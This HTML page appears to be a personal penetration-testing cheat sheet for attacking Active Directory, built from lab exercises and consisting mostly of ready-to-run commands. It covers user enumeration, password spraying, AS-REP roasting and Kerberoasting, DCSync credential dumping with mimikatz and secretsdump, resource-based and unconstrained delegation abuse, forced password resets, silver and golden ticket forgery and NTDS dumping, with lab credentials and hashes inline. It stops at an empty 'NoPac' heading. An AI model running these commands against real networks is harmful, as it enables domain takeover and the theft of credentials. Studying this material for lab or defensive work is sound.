<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400..900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="/H4ckV4ult/styles/navBarStyles.css">
    <link rel="stylesheet" href="/H4ckV4ult/styles/walkthroughs.css">
        <link href="/H4ckV4ult/styles/prism/prism.css" rel="stylesheet" />
    <script src="/H4ckV4ult/styles/prism/prism.js"></script>
    <title>Minimalist Webpage</title>

</head>
<body>
    <div id="navbar-container"></div>
    <script src="/H4ckV4ult/components/navbar.js"></script>

    <div class="main-container">
        <div class="sidebar">
                <h3>Quick content</h3>
                <ul id="sidebar-menu"></ul>
        </div>

    <div class="alternative-notion-container">
        <div class="alternative-notion-header">
            <h1>Active Directory (TCP/53 - DNS, TCP/389 - LDAP, TCP/636 - LDAPS, TCP/88 - Kerberos, TCP/445 - SMB)</h1>
            <p>A directory service developed by Microsoft that acts as a centralized database for managing and organizing resources in a network, particularly within Windows environments. This service relies on multiple ports</p>
        </div>
        <div class="notion-body">
            <h2 id="Enumeration">Enumeration</h2>
            <ul>
                <pre><code class="language-bash">crackmapexec smb 10.10.11.174  #Basic SMB enumeration to check if it vulnerable to SMB relay (signing:False). Additionally you can get the domain name
crackmapexec winrm 10.10.11.250 -u USERNAME -p "PASSWORD"  #Check for WinRM
 crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users #Check for logged on users</code></pre>

            <p>To dump all ldap information</p>
            <pre><code class="language-bash">ldapsearch -H ldap://DOMAIN_NAME -D 'USER@DOMAIN_NAME' -w 'PASSWORD' -b 'dc=DOMAIN_NAME,dc=SECOND_DOMAIN_NAME'</code></pre>
            <p>Another tool to dump itneresting information is windapsearch.py</p>
            <pre><code class="language-bash">python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da #Enum members of group
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU #Enum members privileged-users
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -u #Enum specific user</code></pre>
            
            <h3>User enumeration</h3>
            <ul>
                <p>User enumeration via ldapsearch </p>
                <pre><code class="language-bash">ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "</code></pre>
                <p>User enumration via SID</p>
                <pre><code class="language-bash">impacket-lookupsid anonymous@10.10.11.35 -no-pass</code></pre>
                <p>Once you have an username you can rid-brute</p>
                <pre><code class="language-bash">crackmapexec smb 10.10.11.250 -u USERNAME -p "PASSWORD" --rid-brute #Once you have a user you can rid-brute to show all users
crackmapexec smb 10.10.11.250 -u USERNAME -p "PASSWORD" --users</code></pre>
                <p>The last one is good in case there aren't a lot of users. Even though there is a quicker way to do so</p>
                <pre><code class="language-bash">net user /domain</code></pre>
                <p>Youll need to copy the username list to an excel and format it since powershell show you in three columns</p>   
                
            </ul>

                
                


                <h3>Rpcclient</h3>
                <ul>
                    <p>Null sesion with rpcclient in order to enumerate users</p>
                    <pre><code class="language-bash">rpcclient -U "" 10.10.11.51 -N</code></pre>
                    <p>Once inside, user enumeration</p>
                    <pre><code class="language-bash">enumdomusers #Enumerates all domain users.
srvinfo #Server information.
enumdomains #Enumerate all domains that are deployed in the network.
querydominfo #Provides domain, server, and user information of deployed domains.
netshareenumall #Enumerates all available shares.
netsharegetinfo $sharename #Provides information about a specific share.
queryuser RID  #Provides information about a specific user.</code></pre>
                </ul>

                <h3> BloodHound </h3>
                <ul>
                <p> Utility to gather more information when a <b>user and password have been gathered</b></p>
                <pre><code class="language-bash">bloodhound-ce-python --dns-tcp -ns TARGET_IP -d DOMAIN -u 'USER' -p 'PASS' -c all</code></pre>
                <p>In case you are trying to gather information from another subdomain using a user of a different domain you must specify where this user comes from. (-u parameter)</p>
                <pre><code class="language-bash">bloodhound-ce-python --dns-tcp -ns 172.16.5.238 -d FREIGHTLOGISTICS.LOCAL -u forend@inlanefreight.local -p Klmcargo2 -c all</code></pre>
                <p>From windows we use sharphound, load it into the box and run it. Then export files</p>
                <pre><code class="language-bash">.\SharpHound.exe -c All --zipfilename bloodhound.zip</code></pre>   
                
                <p>Inside bloodhound panel it is important to check the following Pre-build Searches</p>
                <ul>
                    <li> All kerberoasteable users</li>
                    <li> Shortest paths to system trusted for unconstrained delegation (In case you see a user this one can be the entry vector)</li>
                    <li> Shortest paths to domain admins (In case you see a user this one can be the entry vector)</li>                  
                    <li>Principals with foreign domain group membership: <b>This one is useful since it show users from principal domain which are members of child domains groups. In case you get that username you'll be able to access the two domains. If it's an admin you won</b></li>  
                </ul>

                <p> Default groups and users have Object ID over 500 so in case you see and object with priveleges that is not default it may be an entry vector</p>
                <p> Ej: Object ID:S-1-5-21-1677581083-3380853377-188903654-<b>1103</b></p>

                <p> In case you see permision <b>"(GenericAll/GenericWrite/WriteDacl/WriteProperty/etc)"</b> in a group that is not default it may be suspicious. It that case click on it and follow the commands it says</p>
                </ul>
                <h3> Basic AD commands </h3>
                <ul>
                <p>Show all users in the AD</p>
                <pre><code class="language-powershell">Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects -Properties SamAccountName, LastKnownParent |
Select-Object Name, SamAccountName, LastKnownParent</code></pre>
                <p>Restore the user based on the GUID. Previously you need to find a command to show thr GUID of certain user</p>
<pre><code class="language-powershell">$guid = [guid]"938182c3-bf0b-410a-9aaa-45c8e1a02ebf"
Restore-ADObject -Identity $guid</code></pre>
                <p>Getting winlogon credentials</p>
                <pre><code class="language-powershell">reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" </code></pre>
                
                <h3>Acquiring password policy</h3>
                <p>Here we list some ways of acquiring</p>
                <pre><code class="language-powershell">crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
rpcclient $> getdompwinfo
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
net accounts #In case you have access to a computer
PS C:\htb> import-module .\PowerView.ps1 & Get-DomainPolicy</code></pre>
               <h3>PASSWD_NOTREQD</h3>
               <p>If this is set, the user is not subject to the current password policy length, meaning they could have a shorter password or no password at all</p>
               <pre><code class="language-powershell">Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol</code></pre>     
            </ul>
                
                <h3></h3>
                
            </ul>

            <h2 id="Enumerating security controls">Enumerating security controls</h2>
            <ul>
                <h3>Windows Defender</h3>
                <ul>
                <p>In order to check if windows defender is active we could use the following command</p>
                <pre><code class="language-powershell">Get-MpComputerStatus</code></pre>
                </ul>
                
                <h3>AppLocker</h3>
                <ul>
                <p>App locker is a software for whitelisting programs on a computer. We can list the prohibited executables by using that in powershell</p>
                <pre><code class="language-powershell">Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections</code></pre>
                <p>Here are listed all paths of powershell</p>
                <pre><code class="language-powershell">32-bit (x86) PowerShell executable	%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
64-bit (x64) Powershell executable	%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe
32-bit (x86) Powershell ISE executable	%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe
64-bit (x64) Powershell ISE executable	%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell_ise.exe</code></pre>    
                </ul>

                <h3>LAPS (Local Administrator Password Solution)</h3>
                <ul>
                    <p>LAPS is used to randomize and rotate local administrator passwords on Windows hosts and prevent lateral movement. By using the following command we will be able to show the password expiration and if our user has rights the password in clear text</p>
                    <pre><code class="language-powershell">Get-LAPSComputers</code></pre>
                </ul>    
            </ul>

            </ul>
            <h2>Exploitation</h2>
            <ul>
                <h2 id="Certipy Attacks">Certipy Attacks</h2>
                <div class="banner">
                    <a class="cherry-banner" href="certipy.html">
                        <h2>   Check for more information ‚ÜóÔ∏è</h2>
                    </a>
                </div>
                <h2 id="Post exploitation attacks / Bloodhound related">Post exploitation attacks / Bloodhound related</h2>
                <ul>
                    <h3> Resource-based Constrained Delegation attack</h3>
                    <ul>
                        <p> RBCD is an attack technique in Active Directory where an attacker abuses a legitimate Kerberos delegation feature to impersonate any user, including domain admins, to access services on a target machine.</p>
                        <p> Any user with write permissions over a machine account (GenericAll/GenericWrite/WriteDacl/WriteProperty/etc) can set the msDS-AllowedToActOnBehalfOfOtherIdentity (In the other forms of Delegation you needed domain admin privs).</p>
                        <p> The attack goes the following way</p>
                        <ul>
                            <li>The attacker creates or controls a machine account (FakePC$).</li>
                            <li>They modify the msDS-AllowedToActOnBehalfOfOtherIdentity attribute on a target server to allow FakePC$ to delegate to it. </li>
                            <li>Using tools like Rubeus, the attacker requests a Kerberos ticket (TGS) as a high-privileged user (e.g., Administrator) to access services on the target server.</li>
                            <li>The KDC issues the ticket because delegation is allowed ‚Äî no need to know the administrator's password.</li>
                        </ul>
                        <p> To perform this attack you can follow "literally" the commands that bloodhound provides eventhough we used a tool that automates the process</p>
                        <p> Tool: <a class="notion-link" href="https://github.com/tothi/rbcd-attack/blob/master/README.md"> rbcd.py </a></p>
                        <p> Creating fake computer </p>
                        <pre><code class="language-bash">python3 addcomputer.py -computer-name 'evilcomputer$' -computer-pass ev1lP@sS -dc-ip 10.10.11.174 support.htb/support:Ironside47pleasure40Watchful</code></pre>
                        <p>Modifiying delegation rights</p>
                        <pre><code class="language-bash">python3 rbcd.py -f EVILCOMPUTER -t DC -dc-ip 10.10.11.174  support\\support:Ironside47pleasure40Watchful</code></pre>
                        <p>Getting the impersonated service ticket</p>
                        <pre><code class="language-bash">python3 getST.py -spn cifs/DC.support.htb -impersonate Administrator -dc-ip 10.10.11.174 support.htb/EVILCOMPUTER$:ev1lP@sS</code></pre>
                        <p> Exporting ticket and connecting to machine</p>
                    </ul>

                    <h3>Force Change password attack</h3>
                    <ul>
                        <p> An attacker has certain permissions on user object (like GenericWrite, WriteProperty, WriteOwner) which ables him to change the password of user without knowing it</p>
                        <p>To perform this attack you can follow commands that bloodhound provides (more or less becaouse i had to change one a bit)</p>
                        <p>Define our user passwords</p>
                        <pre><code class="language-powershell">$SecPassword = ConvertTo-SecureString 'WqSZAF6CysDQbGb3' -AsPlainText -Force
    $Cred = New-Object System.Management.Automation.PSCredential('sequel\ryan', $SecPassword)</code></pre>
                        <p>Change the owner of our victim user</p>    
                        <pre><code class="language-powershell">Set-DomainObjectOwner -Credential $Cred -Identity VICTIM_USER -OwnerIdentity ATTACKER_USER</code></pre>
                        <p>Change password of the user</p>
                        <pre><code class="language-powershell">Add-DomainObjectAcl -TargetIdentity "VICTIM_USER" -Rights ResetPassword -PrincipalIdentity "ATTACKER_USER"</code></pre>
                        <p>Define the new password for the user</p>
                        <pre><code class="language-powershell">$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force</code></pre>
                        <p>Change user password</p>    
                        <pre><code class="language-powershell">Set-DomainUserPassword -Identity VICTIM_USER -AccountPassword $UserPassword -Credential $Cred</code></pre>    
                        <p>Check if password was changed</p>    
                        <pre><code class="language-bash">crackmapexec smb 10.10.11.51 -u VICTIM_USER -p 'Password123!'</code></pre>   
                    </ul>
                
                
                <h3>Dsync Attack</h3>
                <ul>
                    <p>Having in mind that DCs replicate their data using the protocol of AD replication we can take advantage of this function using a DCsync attack. Must have the following privileges over the domain</p>
                    <ul>
                        <li>GetChanges</li>
                        <li>GetChangesAll</li>
                    </ul>
                    <p>Have in mind that there could be users which use Reversible Encryption Password Storage which means that the passwords are stored in RC4 encryption and the key to decrypt them is stored in the registry and can be extracted with admin rights or equivalent. You can check which are accounts are configured like this by using</p>
                    <pre><code class="language-powershell">Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl</code></pre>
                    <h4>Mimikatz</h4>
                    <ul>
                    <p>Upload mimikatz to the victim server and execute the following command. In case you are in powershell use the " since the software begins to loop if not using it</p>
                    <p>Then crack the hash using hashcat. Hashcat codes can be found <a class="notion-link" href="https://hashcat.net/wiki/doku.php?id=example_hashes">Here</a></p>
                    <pre><code class="language-powershell">.\mimikatz
lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:proxyagent</code></pre>
                    <p>Capture the has NTLM and usit to pass the hash in psexec</p>
                    </ul>
                    <h4>Secretsdump</h4>
                    <ul>
                    <p>You can upload to the DC but it's worth it to do it from outside</p>
                    <pre><code class="language-bash">impacket-secretsdump -outputfile /home/kali/Desktop/result.txt  -just-dc INLANEFREIGHT/adunn@172.16.5.5</code></pre>
                    <p>You can also perform listing for a single user</p>
                    <pre><code class="language-bash">impacket-secretsdump -outputfile /home/kali/Desktop/Hackthebox/here.txt  -just-dc-user syncron INLANEFREIGHT/adunn@172.16.5.5</code></pre>
                    </ul>
                </ul>

                

                <h3>Generic Descendent Object Takeover</h3>
                <ul>
                    <p>In case you found that you have <b>GenricAll</b> permision over an OU you could perform an object Takeover which grants you the control of all the objects inside the OU</p>
                    <pre><code class="language-bash">dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'john' -target-dn 'OU=ADCS,DC=tombwatcher,DC=htb' 'tombwatcher.htb'/'john':'mypassword'</code></pre>
                </ul>
                </ul>
                
                <h2 id="Kerberos Attacks">Kerberos Attacks</h2>
                <p>Kerberos works emiting tickets using the KDC (Key Distribution Center). There are two kinds of tickets</p>
                    <p><b>TGT (Ticket Granting Ticket)</b> -> Emited by KDC and allows to request more tickets</p>
                    <p><b>TGS (Ticket Granting Service)</b> -> Service tickets used to authenticate against an specific service (MSSQL, CIFS, HTTP) </p>
                    <p>Every Service has a related SPN (Service Principal Name) which key is related with the hash of the service account</p>
                <ul>

                    <h3> Kerbrute </h3>
                    <ul>
                        <p>User enumeration</p>
                        <pre><code class="language-bash">kerbrute userenum --dc 10.10.11.69 -d fluffy.htb /usr/share/wordlists/usernames.txt </code></pre>

                        <p>Password spray (One password a lot of users)</p>
                        <pre><code class="language-bash">kerbrute passwordspray --dc 10.10.11.69 -d fluffy.htb users.txt Password@1</code></pre>
                        <ul>
                            <p>Akternative in windows (\DomainPasswordSpray.ps1)</p>
                            <pre><code class="language-powershell"> Import-Module .\DomainPasswordSpray.ps1
 Invoke-DomainPasswordSpray -Password Winter2022 -OutFile success -ErrorAction SilentlyContinue</code></pre>
                        </ul>
                        <p>Brute user (One user a lot of passwords)</p>
                        <pre><code class="language-bash">kerbrute bruteuser --dc 10.10.11.69 -d fluffy.htb /usr/share/wordlists/passwords.txt john </code></pre>
                        <p>Brute Force (combos list)</p>
                        <p>Create a combos list with username and password</p>
                        <pre><code class="language-bash">awk 'NR==FNR{p[++np]=$0; next}{for(i=1;i<=np;i++) 
print $0 ":" p[i]}' passwords.txt users.txt > combos.txt</code></pre>
                        <p>Now execute the attack</p>
                        <pre><code class="language-bash">cat combos.lst | ./kerbrute -d lab.ropnop.com bruteforce -</code></pre>

                    </ul>

                    <h3>AS-REP Roasting Attack</h3>
                    <ul>
                        <p>Request hashes of AD accounts that have enabled the flag "Do not requiere Kerberos preauthentication". In that case an attacker can request a kerberos ticket without having the password for the user</p>
                        <p>Remeber that using kerbrute you can perform the same action</p>
                        <pre><code class="language-bash"> impacket-GetNPUsers -no-pass -usersfile users.txt DOMAIN.LOCAL/</code></pre>
                        <p>Then crack the hash using hashcat. Hashcat codes can be found <a class="notion-link" href="https://hashcat.net/wiki/doku.php?id=example_hashes">Here</a></p>
                        <pre><code class="language-bash">hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt --force</code></pre>
                        <p>Show the hash</p>
                        <pre><code class="language-bash">hashcat --show -m 18200 hash</code></pre>
                        <p>Command in powershell in case you have access to the DC. Remember to use powerview.ps1</p>
                        <pre><code class="language-bash">Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl</code></pre>
                    </ul>
                    <h3>Kerberoasting Attack</h3>
                    <ul>
                        <p>Allows an authenticated attacker to acquire tickets TGS of service accounts in the domain.</p>
                        <pre><code class="language-bash">impacket-GetUsersSPNs DOMAIN.LOCAL/USER:PASSWORD -dc-ip TARGET_IP -request
impacket-GetUsersSPNs DOMAIN.LOCAL/USER:PASSWORD -dc-ip TARGET_IP -request-user USERNAME</code></pre>
                        <p>In case you are targeting a user in another domain you could do</p>
                        <pre><code class="language-bash">impacket-GetUserSPNs  -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley -request</code></pre>
                        
                        <p>Then crack the hash using hashcat. Hashcat codes can be found <a class="notion-link" href="https://hashcat.net/wiki/doku.php?id=example_hashes">Here</a></p>
                        <pre><code class="language-bash">hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt --force</code></pre>
                        <p>Show the hash</p>
                        <pre><code class="language-bash">hashcat --show -m 13100 hash</code></pre>
                        <p>Command in case you are inside a dc or sort of. You'll need powerview.ps1</p>
                        <pre><code class="language-powershell">Get-DomainUser -Identity svc_sql | Get-DomainSPNTicket -Format Hashcat</code></pre>
                        <h4>Rubeus.exe</h4>
                        <ul>
                            <p>We can perform the same thing from inside using rubeus.exe There are some useful commands which should be noted</p>
                            <p>Showing stats about the kerberoastable users and the date of last password change</p>
                            <pre><code class="language-powershell">.\Rubeus.exe kerberoast /stats</code></pre>
                            <p>List all tickets from kerberoastable users</p>
                            <pre><code class="language-powershell">.\Rubeus.exe kerberoast /nowrap</code></pre>
                            <p>Filtering for accounts with admincount=1</p>
                            <pre><code class="language-powershell">.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap</code></pre>
                            <p>Filtering for a single user</p>
                            <pre><code class="language-powershell">.\Rubeus.exe kerberoast /user:svc_vmwaresso /nowrap</code></pre>
                            <p>Showing only RC4 tickets. Which are the easier ones to crack</p>
                            <pre><code class="language-pwoershell">.\Rubeus.exe kerberoast /tgtdeleg /nowrap</code></pre>
                            <p><b>Important note: You should "always" go for tickets which are in RC4 (type 23) encryption mode since it's quickly to crack them. In case you found AES 128/256 (type 24 and 18) have in mind that this ones are harder to crack and hashcat will take it's time. In order to check which type you are facing you could lok at the property supported Etypes or look at the ticket $krb5tgs$18$ ($krb5tgs$TYPE$)</b></p>
                            <b>You can also perform it to a child domain</b>
                            <pre><code class="language-powershell">.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap</code></pre>
                        </ul>
                    </ul>

                    <h3>Ticket attacks</h3>
                    <ul>
                        <h3>Silver Ticket Attack üíø</h3>
                        <ul>
                            <p>Can be performed when an attack gains the NTLM hash of a service account of a SPN (SQL_SVC, svc_exchange...)</p>
                            <p>With that key we can create a TGS for that service</p>
                            <p>But, the ticket is false and is firmed using the key of the service therefor the service accepts as a valid ticket eventhough the ticket has no passed through the KDC</p>
                            <br>
                            <p>In order to perform this attack you'll need the following</p>
                            
                            <p>Generate HASH NTLM from the password of the service account. <a class="notion-link" href="https://www.browserling.com/tools/ntlm-hash">Use this website</a></p>
                            <p>Get domain SUID. Domain needs to be formatted and last part must be removed</p>
                            <pre><code class="language-bash">SELECT SUSER_SID('signed\mssqlsvc');</code></pre>
                            <p>Using ticketer to forge a ticket impersonating IT user </p>
                            <pre><code class="language-bash">ticketer.py -nthash ef699384c3285c54128a3ee1ddb1a0cc \                  
-domain-sid S-1-5-21-4088429403-1159899800-2753317549 \
-domain signed.htb \
-spn MSSQLSvc/dc01.signed.htb:1433 \
-user-id 1103 \
-groups 1105 \        
IT</code></pre>
                            <p>Remember that -user-id and -groups are from the user which you are impersonating. -user-id can be obtained from last part of domain SUID</p>    
                            <pre><code class="language-bash"> export KRB5CCNAME=/home/kali/Downloads/IT.ccache</code></pre>
                            <p>Login using the ticket exported</p>
                            <pre><code class="language-bash">mssqlclient.py dc01.signed.htb -k</code></pre>
                        </ul>

                        <h3>Golden Ticket Attack üìÄ</h3>
                        <ul>
                            <p>In order to perform this attack you'll need</p>
                            <p>KRBTGT Account's NTLM Hash</p>
                            <p>Obviusly you need domain admin on that server to acquire it</p>
                            <pre><code class="language-bash">secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt</code></pre>
                            <br>

                            <b>Domain SID</b>
                            <pre><code class="language-bash">lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240</code></pre>

                            <b>SID of the Admins group</b>
                            <p>Think that the Enterpise Admins group is only in the root domain so from child domains you won't be able to get it. It is recommended to get it from Windows or by using rpcclient</p>
                            <p>In case your credentials are not valid in the DC you won't be able to login</p>
                            <pre><code class="language-bash">ldapsearch -x -H ldap://inlanefreight.local 
-D "htb-student_adm@inlanefreight.local" -w HTB_@cademy_stdnt_admin! 
-b "dc=inlanefreight,dc=local" "(cn=Enterprise Admins)" objectSid</code></pre>
                            <p>Finally perform the attack using ticketer.py</p>
                            <pre><code class="language-bash">ticketer.py -nthash 9d765b482771505cbe97411065964d5f 
-domain-sid DOMAIN_SID -domain logistics.inlanefreight.local -extra-sid SID_OF_ADMINS_GROUP hacker
export KRB5CCNAME=/tmp/hacker.ccache
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5 </code></pre>
                            <b>You can also use this atopwn tool to automate the attack</b>
                            <pre><code class="language-bash">raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm</code></pre>
                            <p>Since you won't be able to do something when you get the shell i recommend you to dump the NTDS.dit</p>
                            <pre><code class="language-bash">netexec smb 172.16.5.5 -u Administrator -H 88ad09182de639ccc6579eb0849751cf -M ntdsutil</code></pre>
                        </ul>

                        <h3>Diamon Ticket Attack üî∑</h3>
                        <ul>
                            <p>Under construction</p>
                        </ul>
                    </ul>

                    <h3>Kerberos double hoping</h3>
                    <ul>
                        <p>The "Double Hop" problem often occurs when using WinRM/Powershell since the default authentication mechanism only provides a ticket to access a specific resource. This will likely cause issues when trying to perform lateral movement or even access file shares from the remote shell. In this situation, the user account being used has the rights to perform an action but is denied access</p>
                        <p>There are some workarrounds we can use in order to fix this</p>
                        <h4>Workaround #1: PSCredential Object</h4>
                        <ul>
                            <p>Setup variables to store the password for the user you control</p>
                            <pre><code class="language-bash">$SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)</code></pre>
                            <p>Execute the command pointing to the domain</p>    
                            <pre><code class="language-bash">get-domainuser -spn -credential $Cred | select samaccountname</code></pre>
                            
                        </ul>
                        <h4>Workaround #2: Register PSSession Configuration</h4>
                        <ul>
                        <p>Establish a winrm sesion to remote host</p>
                        <pre><code class="language-bash">Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL -Credential inlanefreight\backupadm</code></pre>
                        <p>Import powerview </p>
                        <pre><code class="language-bash">Import-Module .\PowerView.ps1</code></pre>
                        <p>Register a new session configuration using the Register-PSSessionConfiguration </p>
                        <pre><code class="language-bash">Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm</code></pre>
                        <p>Restart winrm service</p>
                        <pre><code class="language-bash">Restart-Service WinRM</code></pre>
                        <p>Establish again a winrm session to remote host and you are done</p>
                        <pre><code class="language-bash">Enter-PSSession -ConfigurationName backupadmsess -ComputerName ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL -Credential inlanefreight\backupadm</code></pre>
                        </ul>    
                    </ul>

                    <h3>Kerberos Constrained Delegation</h3>
                    <ul>
                        <p>In case you found an account that has kerberos constrained delegation enabled it is possible to impersonate any domain user. Use the following command to check for users with that propery</p>
                        <pre><code class="language-powershell">Get-NetUser -TrustedToAuth</code></pre>
                        <p>Now check the field <b>msds-allowedtodelegateto</b> in case you see the DC you are likely to keep forward</p>
                        <p>Compromise that user and login as it, then use rubeus to request a delegation TGT</p>
                        <pre><code class="language-powershell">Rubeus.exe tgtdeleg /nowrap</code></pre>
                        <p>Use the ticket obtained to impersonate the user</p>
                        <pre><code class="language-powershell">Rubeus.exe s4u /ticket:BASE64_TICKET_HERE /impersonateuser:administrator /domain:offense.local /msdsspn:cifs/dc01.offense.local /dc:dc01.offense.local /ptt</code></pre>
                        <p>Then you'll see two tickets, the second one is the important, with that ticket imported automatically you can access the dc directly by typing <b>dir \\dc01.inlanefreight.local\C$</b> or use secretsdump.py obviously exporting the ticket previously</p>
                        <pre><code class="language-powershell">secretsdump.py -k -no-pass INLANEFREIGHT/administrator@ACADEMY-EA-DC01.inlanefreight.local</code></pre>
                    </ul>

                    <h3>Kerberos Unconstrained Delegation</h3>
                    <ul>
                        <p>This attack consists in a insecure configuration in AD which allows a service to impersonate any user who authenticate against it. The key here is that a computer o an account can be configuted as <b>Trust this computer/user for delegation to any service (Kerberos only)</b></p>
                        <p>We can list all users/computers configured that way with the following PS command</p>
                        <pre><code class="language-powershell">Get-ADComputer -Filter {TrustedForDelegation -eq $true -and primarygroupid -eq 515} -Properties trustedfordelegation,serviceprincipalname,description</code></pre>
                        <p>In case we found a computer we will need to login into it. Once there we can execute mimikatz to check if there are tickets in memory</p>
                        <pre><code class="language-powershell">mimikatz# sekurlsa::tickets</code></pre>
                        <p>As we won't found no tickets we'll need to access the DC and perform a query to our victim computer in order to force the DC to perform an interaction that will log it's ticket in the victim computer.</p>
                        <pre><code class="language-powershell">Invoke-WebRequest http://iis01.offense.local -UseDefaultCredentials -UseBasicParsing</code></pre>
                        <p>We could aso perform a share access which will make to log the ticket in memory</p>
                        <pre><code class="language-powershell">dir \\ATTACKER\share</code></pre>
                        <p>Finally repeat the mimikatz command which will list the ticket of the administrator. We can export the ticket by doing</p>
                        <pre><code class="language-powershell">privilege::debug
sekurlsa::tickets /export</code></pre>
                        <p>Looking at the output you'll recieve a .kirbi file with the content of the ticket. Now we can use this ticket to perform pass-the-ticket attack</p>
                        <pre><code class="language-powershell"> mimikatz # kerberos::ptt C:\Users\Administrator\Desktop\mimikatz\NAME_OF-THE_FILE.kirbi</code></pre>
                        <p>This will export the ticket so we will be able to access the DC by doing</p>
                        <pre><code class="language-powershell">dir\\dc01\c$</code></pre>
                    </ul>

                    <h3>Kerberos Resource-based Constrained Delegation</h3>
                    <ul>
                        <p>This attack allows a resource (server) to decide who can impersonate users agains it. The attack goes this way. If I control computer A and i can write AD object of a computer B, i can say to that computer. Trust computer A in order to impersonate any user</p>
                        <p>To do so, we'll need to check the machine quota </p>
                        <pre><code class="language-powershell">Get-DomainObject -Identity "dc=offense,dc=local" -Domain offense.local</code></pre>
                        <p>We need a DC with at least a Windows server 2012 (Get-DomainController)</p>  
                        <p>And we need that our target computer don't have the attribute msds-allowedtoactonbehalfofotheridentity set</p>
                        <pre><code class="language-powershell">Get-NetComputer TARGET_COMPUTERNAME | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity</code></pre>
                        <h4>Starting the attack</h4>
                        <p>Let's now create a fake computer</p>
                        <pre><code class="language-powershell">import-module powermad
New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose</code></pre>
                        <p>Now let's get the SID of that computer. Grab the SID because we'll needed later</p>
                        <pre><code class="language-powershell">Get-DomainComputer fake01 </code></pre>
                        <p>Create a new raw security descriptor for the FAKE01</p>
                        <pre><code class="language-powershell">$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-2552734371-813931464-1050690807-1154)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)</code></pre>
                        <p>Now apply the security descriptor bytes to the target machine. Remember to have full control over the target computer. In case we don't have privileges we'll see it</p>
                        <pre><code class="language-powershell">Get-DomainComputer TARGET_COMPUTERNAME | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose</code></pre>
                        <p>We can check it by doing</p>
                        <pre><code class="language-powershell">Get-DomainComputer TARGET_COMPUTERNAME -Properties 'msds-allowedtoactonbehalfofotheridentity'</code></pre>
                        <p>Even we can check if the security descriptor assigned to the TARGET_COMPUTERNAME refers to fake01$</p> 
                        <pre><code class="language-powershell">(New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0).DiscretionaryAcl</code></pre>
                        <h4>Exploitation</h4>
                        <p>Now let's generate an RC4 hash of the password we set for the fake01 computer</p>
                        <pre><code class="language-powershell">Rubeus.exe hash /password:123456 /user:fake01 /domain:offense.local</code></pre>    
                        <p>Grab that hash from the rc4_mac field and use it in the following command to impersonate any user</p>
                        <pre><code class="language-powershell">rubeus.exe s4u /user:fake01$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:spotless /msdsspn:cifs/ws01.offense.local /ptt</code></pre>    
                        <p>You'll see two tickets and the important one is the second one in case you have it you will be able to list content from that computer</p>
                        <pre><code class="language-powershell">dir \\TARGET_COMPUTER\C$</code></pre>
                    </ul>
                </ul> 
                
                <h2 id="NoPac">NoPac</h2>
